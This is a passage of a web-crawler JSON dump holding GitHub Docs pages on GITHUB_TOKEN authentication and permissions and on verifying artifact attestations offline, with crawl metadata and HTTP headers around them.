`repo:ORG_NAME/*`\n    *   Example: `repo:octo-org/*`\n*   **Custom claim:**\n    \n    *   Syntax: `job_workflow_ref:ORG_NAME/REPO_NAME/.github/workflows/WORKFLOW_FILE@ref`\n    *   Example: `job_workflow_ref:octo-org/octo-automation/.github/workflows/deployment.yml@ 10040c56a8c0253d69db7c1f26a0d227275512e2`",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 240,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-hardening-your-deployments-using-openid-connect-with-reusable-workflows-origin",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-hardening-your-deployments-using-openid-connect-with-reusable-workflows-remove",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-hardening-your-deployments-using-openid-connect-with-reusable-workflows-extrac",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-hardening-your-deployments-using-openid-connect-with-reusable-workflows-readab",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-hardening-your-deployments-using-openid-connect-with-reusable-workflows-readab"
    },
    "lengths": {
      "extractus": 8087,
      "readableText": 7674,
      "none": 30661,
      "readableTextIfPossible": 7674,
      "result": 7674,
      "markdown": 5800
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/security-for-github-actions/security-guides/automatic-token-authentication",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/security-for-github-actions/security-guides/automatic-token-authentication",
    "loadedTime": "2025-05-08T06:37:19.320Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/security-for-github-actions/security-guides/automatic-token-authentication",
    "title": "Automatic token authentication - GitHub Docs",
    "description": "GitHub provides a token that you can use to authenticate on behalf of GitHub Actions.",
    "author": null,
    "keywords": null,
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Automatic token authentication - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/security-for-github-actions/security-guides/automatic-token-authentication"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/security-for-github-actions/security-guides/automatic-token-authentication"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "1B54:228DF:5B84F6:77EB2E:681C0190",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "20357",
      "date": "Thu, 08 May 2025 06:37:09 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-lga21932-LGA",
      "x-cache": "HIT",
      "x-cache-hits": "0",
      "x-timer": "S1746686229.325412, VS0, VE1",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "29752",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Automatic token authentication - GitHub Docs\nGitHub provides a token that you can use to authenticate on behalf of GitHub Actions.\nAbout the GITHUB_TOKEN secret\nAt the start of each workflow job, GitHub automatically creates a unique GITHUB_TOKEN secret to use in your workflow. You can use the GITHUB_TOKEN to authenticate in the workflow job.\nWhen you enable GitHub Actions, GitHub installs a GitHub App on your repository. The GITHUB_TOKEN secret is a GitHub App installation access token. You can use the installation access token to authenticate on behalf of the GitHub App installed on your repository. The token's permissions are limited to the repository that contains your workflow. For more information, see Permissions for the GITHUB_TOKEN.\nBefore each job begins, GitHub fetches an installation access token for the job. The GITHUB_TOKEN expires when a job finishes or after a maximum of 24 hours.\nThe token is also available in the github.token context. For more information, see Accessing contextual information about workflow runs.\nUsing the GITHUB_TOKEN in a workflow\nYou can use the GITHUB_TOKEN by using the standard syntax for referencing secrets: ${{ secrets.GITHUB_TOKEN }}. Examples of using the GITHUB_TOKEN include passing the token as an input to an action, or using it to make an authenticated GitHub API request.\nImportant\nAn action can access the GITHUB_TOKEN through the github.token context even if the workflow does not explicitly pass the GITHUB_TOKEN to the action. As a good security practice, you should always make sure that actions only have the minimum access they require by limiting the permissions granted to the GITHUB_TOKEN. For more information, see Permissions for the GITHUB_TOKEN.\nWhen you use the repository's GITHUB_TOKEN to perform tasks, events triggered by the GITHUB_TOKEN, with the exception of workflow_dispatch and repository_dispatch, will not create a new workflow run. This prevents you from accidentally creating recursive workflow runs. For example, if a workflow run pushes code using the repository's GITHUB_TOKEN, a new workflow will not run even when the repository contains a workflow configured to run when push events occur.\nCommits pushed by a GitHub Actions workflow that uses the GITHUB_TOKEN do not trigger a GitHub Pages build.\nExample 1: passing the GITHUB_TOKEN as an input\nThis example workflow uses the GitHub CLI, which requires the GITHUB_TOKEN as the value for the GH_TOKEN input parameter:\nYAML\nname: Open new issue on: workflow_dispatch jobs: open-issue: runs-on: ubuntu-latest permissions: contents: read issues: write steps: - run: | gh issue --repo ${{ github.repository }} \\ create --title \"Issue title\" --body \"Issue body\" env: GH_TOKEN: ${{ secrets.GITHUB_TOKEN }} \nExample 2: calling the REST API\nYou can use the GITHUB_TOKEN to make authenticated API calls. This example workflow creates an issue using the GitHub REST API:\nname: Create issue on commit on: [ push ] jobs: create_issue: runs-on: ubuntu-latest permissions: issues: write steps: - name: Create issue using REST API run: | curl --request POST \\ --url https://api.github.com/repos/${{ github.repository }}/issues \\ --header 'authorization: Bearer ${{ secrets.GITHUB_TOKEN }}' \\ --header 'content-type: application/json' \\ --data '{ \"title\": \"Automated issue for commit: ${{ github.sha }}\", \"body\": \"This issue was automatically created by the GitHub Action workflow **${{ github.workflow }}**. \\n\\n The commit hash was: _${{ github.sha }}_.\" }' \\ --fail \nPermissions for the GITHUB_TOKEN\nFor information about the API endpoints GitHub Apps can access with each permission, see Permissions required for GitHub Apps.\nThe following table shows the permissions granted to the GITHUB_TOKEN by default. People with admin permissions to an enterprise, organization, or repository, can set the default permissions to be either permissive or restricted. For information on how to set the default permissions for the GITHUB_TOKEN for your enterprise, organization, or repository, see Enforcing policies for GitHub Actions in your enterprise, Disabling or limiting GitHub Actions for your organization, or Managing GitHub Actions settings for a repository.\nNote\nWhen a workflow is triggered by the pull_request_target event, the GITHUB_TOKEN is granted read/write repository permission, even when it is triggered from a public fork. For more information, see Events that trigger workflows.\nPrivate repositories can control whether pull requests from forks can run workflows, and can configure the permissions assigned to GITHUB_TOKEN. For more information, see Managing GitHub Actions settings for a repository.\nWorkflow runs triggered by Dependabot pull requests run as if they are from a forked repository, and therefore use a read-only GITHUB_TOKEN. These workflow runs cannot access any secrets. For information about strategies to keep these workflows secure, see Security hardening for GitHub Actions.\nModifying the permissions for the GITHUB_TOKEN\nYou can modify the permissions for the GITHUB_TOKEN in individual workflow files. If the default permissions for the GITHUB_TOKEN are restrictive, you may have to elevate the permissions to allow some actions and commands to run successfully. If the default permissions are permissive, you can edit the workflow file to remove some permissions from the GITHUB_TOKEN. As a good security practice, you should grant the GITHUB_TOKEN the least required access.\nYou can see the permissions that GITHUB_TOKEN had for a specific job in the \"Set up job\" section of the workflow run log. For more information, see Using workflow run logs.\nYou can use the permissions key in your workflow file to modify permissions for the GITHUB_TOKEN for an entire workflow or for individual jobs. This allows you to configure the minimum required permissions for a workflow or job.\nYou can use the permissions key to add and remove read permissions for forked repositories, but typically you can't grant write access. The exception to this behavior is where an admin user has selected the Send write tokens to workflows from pull requests option in the GitHub Actions settings. For more information, see Managing GitHub Actions settings for a repository.\nThe two workflow examples earlier in this article show the permissions key being used at the job level, as it is best practice to limit the permissions' scope.\nFor full details of the permissions key, see Workflow syntax for GitHub Actions.\nNote\nOrganization owners can prevent you from granting write access to the GITHUB_TOKEN at the repository level. For more information, see Disabling or limiting GitHub Actions for your organization.\nWhen the permissions key is used, all unspecified permissions are set to no access, with the exception of the metadata scope, which always gets read access.\nHow the permissions are calculated for a workflow job\nThe permissions for the GITHUB_TOKEN are initially set to the default setting for the enterprise, organization, or repository. If the default is set to the restricted permissions at any of these levels then this will apply to the relevant repositories. For example, if you choose the restricted default at the organization level then all repositories in that organization will use the restricted permissions as the default. The permissions are then adjusted based on any configuration within the workflow file, first at the workflow level and then at the job level. Finally, if the workflow was triggered by a pull request from a forked repository, and the Send write tokens to workflows from pull requests setting is not selected, the permissions are adjusted to change any write permissions to read only.\nGranting additional permissions\nIf you need a token that requires permissions that aren't available in the GITHUB_TOKEN, you can create a GitHub App and generate an installation access token within your workflow. For more information, see Making authenticated API requests with a GitHub App in a GitHub Actions workflow. Alternatively, you can create a personal access token, store it as a secret in your repository, and use the token in your workflow with the ${{ secrets.SECRET_NAME }} syntax. For more information, see Managing your personal access tokens and Using secrets in GitHub Actions.\nFurther reading\nRate limits for the REST API",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-guides-automatic-token-authentication-qppvg.html",
  "markdown": "# Automatic token authentication - GitHub Docs\n\nGitHub provides a token that you can use to authenticate on behalf of GitHub Actions.\n\n## [About the `GITHUB_TOKEN` secret](#about-the-github_token-secret)\n\nAt the start of each workflow job, GitHub automatically creates a unique `GITHUB_TOKEN` secret to use in your workflow. You can use the `GITHUB_TOKEN` to authenticate in the workflow job.\n\nWhen you enable GitHub Actions, GitHub installs a GitHub App on your repository. The `GITHUB_TOKEN` secret is a GitHub App installation access token. You can use the installation access token to authenticate on behalf of the GitHub App installed on your repository. The token's permissions are limited to the repository that contains your workflow. For more information, see [Permissions for the `GITHUB_TOKEN`](#permissions-for-the-github_token).\n\nBefore each job begins, GitHub fetches an installation access token for the job. The `GITHUB_TOKEN` expires when a job finishes or after a maximum of 24 hours.\n\nThe token is also available in the `github.token` context. For more information, see [Accessing contextual information about workflow runs](https://docs.github.com/en/actions/learn-github-actions/contexts#github-context).\n\n## [Using the `GITHUB_TOKEN` in a workflow](#using-the-github_token-in-a-workflow)\n\nYou can use the `GITHUB_TOKEN` by using the standard syntax for referencing secrets: `${{ secrets.GITHUB_TOKEN }}`. Examples of using the `GITHUB_TOKEN` include passing the token as an input to an action, or using it to make an authenticated GitHub API request.\n\nImportant\n\nAn action can access the `GITHUB_TOKEN` through the `github.token` context even if the workflow does not explicitly pass the `GITHUB_TOKEN` to the action. As a good security practice, you should always make sure that actions only have the minimum access they require by limiting the permissions granted to the `GITHUB_TOKEN`. For more information, see [Permissions for the `GITHUB_TOKEN`](#permissions-for-the-github_token).\n\nWhen you use the repository's `GITHUB_TOKEN` to perform tasks, events triggered by the `GITHUB_TOKEN`, with the exception of `workflow_dispatch` and `repository_dispatch`, will not create a new workflow run. This prevents you from accidentally creating recursive workflow runs. For example, if a workflow run pushes code using the repository's `GITHUB_TOKEN`, a new workflow will not run even when the repository contains a workflow configured to run when `push` events occur.\n\nCommits pushed by a GitHub Actions workflow that uses the `GITHUB_TOKEN` do not trigger a GitHub Pages build.\n\n### [Example 1: passing the `GITHUB_TOKEN` as an input](#example-1-passing-the-github_token-as-an-input)\n\nThis example workflow uses the [GitHub CLI](https://docs.github.com/en/actions/using-workflows/using-github-cli-in-workflows), which requires the `GITHUB_TOKEN` as the value for the `GH_TOKEN` input parameter:\n\nYAML\n\n```\nname: Open new issue\non: workflow_dispatch\n\njobs:\n  open-issue:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n      issues: write\n    steps:\n      - run: |\n          gh issue --repo ${{ github.repository }} \\\n            create --title \"Issue title\" --body \"Issue body\"\n        env:\n          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n```\n\n### [Example 2: calling the REST API](#example-2-calling-the-rest-api)\n\nYou can use the `GITHUB_TOKEN` to make authenticated API calls. This example workflow creates an issue using the GitHub REST API:\n\n```\nname: Create issue on commit\n\non: [ push ]\n\njobs:\n  create_issue:\n    runs-on: ubuntu-latest\n    permissions:\n      issues: write\n    steps:\n      - name: Create issue using REST API\n        run: |\n          curl --request POST \\\n          --url https://api.github.com/repos/${{ github.repository }}/issues \\\n          --header 'authorization: Bearer ${{ secrets.GITHUB_TOKEN }}' \\\n          --header 'content-type: application/json' \\\n          --data '{\n            \"title\": \"Automated issue for commit: ${{ github.sha }}\",\n            \"body\": \"This issue was automatically created by the GitHub Action workflow **${{ github.workflow }}**. \\n\\n The commit hash was: _${{ github.sha }}_.\"\n            }' \\\n          --fail\n```\n\n## [Permissions for the `GITHUB_TOKEN`](#permissions-for-the-github_token)\n\nFor information about the API endpoints GitHub Apps can access with each permission, see [Permissions required for GitHub Apps](https://docs.github.com/en/rest/overview/permissions-required-for-github-apps).\n\nThe following table shows the permissions granted to the `GITHUB_TOKEN` by default. People with admin permissions to an enterprise, organization, or repository, can set the default permissions to be either permissive or restricted. For information on how to set the default permissions for the `GITHUB_TOKEN` for your enterprise, organization, or repository, see [Enforcing policies for GitHub Actions in your enterprise](https://docs.github.com/en/enterprise-cloud@latest/admin/policies/enforcing-policies-for-your-enterprise/enforcing-policies-for-github-actions-in-your-enterprise#enforcing-a-policy-for-workflow-permissions-in-your-enterprise), [Disabling or limiting GitHub Actions for your organization](https://docs.github.com/en/organizations/managing-organization-settings/disabling-or-limiting-github-actions-for-your-organization#setting-the-permissions-of-the-github_token-for-your-organization), or [Managing GitHub Actions settings for a repository](https://docs.github.com/en/repositories/managing-your-repositorys-settings-and-features/enabling-features-for-your-repository/managing-github-actions-settings-for-a-repository#setting-the-permissions-of-the-github_token-for-your-repository).\n\nNote\n\n*   When a workflow is triggered by the [`pull_request_target`](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull_request_target) event, the `GITHUB_TOKEN` is granted read/write repository permission, even when it is triggered from a public fork. For more information, see [Events that trigger workflows](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull_request_target).\n*   Private repositories can control whether pull requests from forks can run workflows, and can configure the permissions assigned to `GITHUB_TOKEN`. For more information, see [Managing GitHub Actions settings for a repository](https://docs.github.com/en/repositories/managing-your-repositorys-settings-and-features/enabling-features-for-your-repository/managing-github-actions-settings-for-a-repository#enabling-workflows-for-forks-of-private-repositories).\n*   Workflow runs triggered by Dependabot pull requests run as if they are from a forked repository, and therefore use a read-only `GITHUB_TOKEN`. These workflow runs cannot access any secrets. For information about strategies to keep these workflows secure, see [Security hardening for GitHub Actions](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions).\n\n### [Modifying the permissions for the `GITHUB_TOKEN`](#modifying-the-permissions-for-the-github_token)\n\nYou can modify the permissions for the `GITHUB_TOKEN` in individual workflow files. If the default permissions for the `GITHUB_TOKEN` are restrictive, you may have to elevate the permissions to allow some actions and commands to run successfully. If the default permissions are permissive, you can edit the workflow file to remove some permissions from the `GITHUB_TOKEN`. As a good security practice, you should grant the `GITHUB_TOKEN` the least required access.\n\nYou can see the permissions that `GITHUB_TOKEN` had for a specific job in the \"Set up job\" section of the workflow run log. For more information, see [Using workflow run logs](https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/using-workflow-run-logs).\n\nYou can use the `permissions` key in your workflow file to modify permissions for the `GITHUB_TOKEN` for an entire workflow or for individual jobs. This allows you to configure the minimum required permissions for a workflow or job.\n\nYou can use the `permissions` key to add and remove read permissions for forked repositories, but typically you can't grant write access. The exception to this behavior is where an admin user has selected the **Send write tokens to workflows from pull requests** option in the GitHub Actions settings. For more information, see [Managing GitHub Actions settings for a repository](https://docs.github.com/en/repositories/managing-your-repositorys-settings-and-features/enabling-features-for-your-repository/managing-github-actions-settings-for-a-repository#enabling-workflows-for-private-repository-forks).\n\nThe two workflow examples earlier in this article show the `permissions` key being used at the job level, as it is best practice to limit the permissions' scope.\n\nFor full details of the `permissions` key, see [Workflow syntax for GitHub Actions](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#permissions).\n\nNote\n\nOrganization owners can prevent you from granting write access to the `GITHUB_TOKEN` at the repository level. For more information, see [Disabling or limiting GitHub Actions for your organization](https://docs.github.com/en/organizations/managing-organization-settings/disabling-or-limiting-github-actions-for-your-organization#setting-the-permissions-of-the-github_token-for-your-organization).\n\nWhen the `permissions` key is used, all unspecified permissions are set to no access, with the exception of the `metadata` scope, which always gets read access.\n\n#### [How the permissions are calculated for a workflow job](#how-the-permissions-are-calculated-for-a-workflow-job)\n\nThe permissions for the `GITHUB_TOKEN` are initially set to the default setting for the enterprise, organization, or repository. If the default is set to the restricted permissions at any of these levels then this will apply to the relevant repositories. For example, if you choose the restricted default at the organization level then all repositories in that organization will use the restricted permissions as the default. The permissions are then adjusted based on any configuration within the workflow file, first at the workflow level and then at the job level. Finally, if the workflow was triggered by a pull request from a forked repository, and the **Send write tokens to workflows from pull requests** setting is not selected, the permissions are adjusted to change any write permissions to read only.\n\n### [Granting additional permissions](#granting-additional-permissions)\n\nIf you need a token that requires permissions that aren't available in the `GITHUB_TOKEN`, you can create a GitHub App and generate an installation access token within your workflow. For more information, see [Making authenticated API requests with a GitHub App in a GitHub Actions workflow](https://docs.github.com/en/apps/creating-github-apps/guides/making-authenticated-api-requests-with-a-github-app-in-a-github-actions-workflow). Alternatively, you can create a personal access token, store it as a secret in your repository, and use the token in your workflow with the `${{ secrets.SECRET_NAME }}` syntax. For more information, see [Managing your personal access tokens](https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/creating-a-personal-access-token) and [Using secrets in GitHub Actions](https://docs.github.com/en/actions/security-guides/using-secrets-in-github-actions).\n\n### [Further reading](#further-reading)\n\n*   [Rate limits for the REST API](https://docs.github.com/en/rest/overview/rate-limits-for-the-rest-api)",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasMinWordsCrawleeHtmlToText",
    "totalLinks": 259,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-guides-automatic-token-authentication-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-guides-automatic-token-authentication-removedElementsHtmlUrl",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-guides-automatic-token-authentication-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-guides-automatic-token-authentication-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-guides-automatic-token-authentication-readableTextIfPossibleHtmlUrl"
    },
    "lengths": {
      "extractus": 15546,
      "readableText": 14261,
      "none": 37752,
      "readableTextIfPossible": 14261,
      "result": 14261,
      "markdown": 11684
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/security-for-github-actions/using-artifact-attestations/verifying-attestations-offline",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/security-for-github-actions/using-artifact-attestations/verifying-attestations-offline",
    "loadedTime": "2025-05-08T06:37:24.513Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/security-for-github-actions/using-artifact-attestations/verifying-attestations-offline",
    "title": "Verifying attestations offline - GitHub Docs",
    "description": "Artifact attestations can be verified without an internet connection.",
    "author": null,
    "keywords": "Actions,Security,Workflows",
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Verifying attestations offline - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/security-for-github-actions/using-artifact-attestations/verifying-attestations-offline"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/security-for-github-actions/using-artifact-attestations/verifying-attestations-offline"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "6317:F457B:473E:5E56:681C511D",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:37:17 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-lga21932-LGA",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686237.112435, VS0, VE289",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "25968",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Verifying attestations offline - GitHub Docs\nArtifact attestations can be verified without an internet connection.\nIntroduction\nArtifact attestations are a great way to create unfalsifiable provenance and integrity guarantees for the software you build.\nBy default, attestations are stored in GitHub's attestation API, which gh attestation verify will query when you go to verify your attestation. That command will also contact GitHub's servers to check for updated key material to use to verify the attestation.\nThis command can work without internet connectivity, but you need to supply the attestation bundle and the key material in the trusted root manually.\nBefore starting this guide, you should be building with generating artifact attestations. See Using artifact attestations to establish provenance for builds.\nStep 1: Download attestation bundle\nFirst, get the attestation bundle from the attestation API.\nYou can do so with the following command from a machine that is online:\nBash\ngh attestation download PATH/TO/YOUR/BUILD/ARTIFACT-BINARY -R ORGANIZATION_NAME/REPOSITORY_NAME \nHere is example output from that command:\nWrote attestations to file sha256:ae57936def59bc4c75edd3a837d89bcefc6d3a5e31d55a6fa7a71624f92c3c3b.jsonl. Any previous content has been overwritten The trusted metadata is now available at sha256:ae57936def59bc4c75edd3a837d89bcefc6d3a5e31d55a6fa7a71624f92c3c3b.jsonl \nStep 2: Download trusted roots\nNext, get the key material from the trusted roots.\nArtifact attestations uses the Sigstore public good instance for public repositories, and GitHub's Sigstore instance for private repositories. You can use one command to get both trusted roots:\nBash\ngh attestation trusted-root > trusted_root.jsonl \nUpdating trusted root information in an offline environment\nIt's best practice to generate a new trusted_root.jsonl file any time you are importing new signed material into your offline environment.\nThe key material in trusted_root.jsonl does not have a built-in expiration date, so anything signed before you generate the trusted root file will continue to successfully verify. Anything signed after the file is generated will verify until that Sigstore instance rotates its key material, which typically happens a few times per year. You will not know if key material has been revoked since you last generated the trusted root file.\nStep 3: Perform offline verification\nNow, you are ready to verify the artifact offline.\nYou should import into your offline environment:\nGitHub CLI\nYour artifact\nThe bundle file\nThe trusted root file\nYou can then perform offline verification with the following command:\nBash\ngh attestation verify PATH/TO/YOUR/BUILD/ARTIFACT-BINARY -R ORGANIZATION_NAME/REPOSITORY_NAME --bundle sha256:ae57936def59bc4c75edd3a837d89bcefc6d3a5e31d55a6fa7a71624f92c3c3b.jsonl --custom-trusted-root trusted_root.jsonl \nConclusion\nYou are now verifying artifact attestations in an offline environment. We recommend importing a new trusted root whenever you are introducing new signed artifacts to your offline environment.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-using-artifact-attestations-verifying-attestations-offline-0wvpe.html",
  "markdown": "# Verifying attestations offline - GitHub Docs\n\nArtifact attestations can be verified without an internet connection.\n\n## [Introduction](#introduction)\n\nArtifact attestations are a great way to create unfalsifiable provenance and integrity guarantees for the software you build.\n\nBy default, attestations are stored in GitHub's attestation API, which `gh attestation verify` will query when you go to verify your attestation. That command will also contact GitHub's servers to check for updated key material to use to verify the attestation.\n\nThis command can work without internet connectivity, but you need to supply the attestation bundle and the key material in the trusted root manually.\n\nBefore starting this guide, you should be building with generating artifact attestations. See [Using artifact attestations to establish provenance for builds](https://docs.github.com/en/actions/security-guides/using-artifact-attestations-to-establish-provenance-for-builds).\n\n## [Step 1: Download attestation bundle](#step-1-download-attestation-bundle)\n\nFirst, get the attestation bundle from the attestation API.\n\nYou can do so with the following command from a machine that is online:\n\nBash\n\n```\ngh attestation download PATH/TO/YOUR/BUILD/ARTIFACT-BINARY -R ORGANIZATION_NAME/REPOSITORY_NAME\n```\n\nHere is example output from that command:\n\n```\nWrote attestations to file sha256:ae57936def59bc4c75edd3a837d89bcefc6d3a5e31d55a6fa7a71624f92c3c3b.jsonl.\nAny previous content has been overwritten\n\nThe trusted metadata is now available at sha256:ae57936def59bc4c75edd3a837d89bcefc6d3a5e31d55a6fa7a71624f92c3c3b.jsonl\n```\n\n## [Step 2: Download trusted roots](#step-2-download-trusted-roots)\n\nNext, get the key material from the trusted roots.\n\nArtifact attestations uses the Sigstore public good instance for public repositories, and GitHub's Sigstore instance for private repositories. You can use one command to get both trusted roots:\n\nBash\n\n```\ngh attestation trusted-root > trusted_root.jsonl\n```\n\n### [Updating trusted root information in an offline environment](#updating-trusted-root-information-in-an-offline-environment)\n\nIt's best practice to generate a new `trusted_root.jsonl` file any time you are importing new signed material into your offline environment.\n\nThe key material in `trusted_root.jsonl` does not have a built-in expiration date, so anything signed before you generate the trusted root file will continue to successfully verify. Anything signed after the file is generated will verify until that Sigstore instance rotates its key material, which typically happens a few times per year. You will not know if key material has been revoked since you last generated the trusted root file.\n\n## [Step 3: Perform offline verification](#step-3-perform-offline-verification)\n\nNow, you are ready to verify the artifact offline.\n\nYou should import into your offline environment:\n\n*   GitHub CLI\n*   Your artifact\n*   The bundle file\n*   The trusted root file\n\nYou can then perform offline verification with the following command:\n\nBash\n\n```\ngh attestation verify PATH/TO/YOUR/BUILD/ARTIFACT-BINARY -R ORGANIZATION_NAME/REPOSITORY_NAME --bundle sha256:ae57936def59bc4c75edd3a837d89bcefc6d3a5e31d55a6fa7a71624f92c3c3b.jsonl --custom-trusted-root trusted_root.jsonl\n```\n\n## [Conclusion](#conclusion)\n\nYou are now verifying artifact attestations in an offline environment. We recommend importing a new trusted root whenever you are introducing new signed artifacts to your offline environment.",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasMinWordsCrawleeHtmlToText",
    "totalLinks": 234,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-using-artifact-attestations-verifying-attestations-offline-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-using-artifact-attestations-verifying-attestations-offline-removedElementsHtmlUrl",
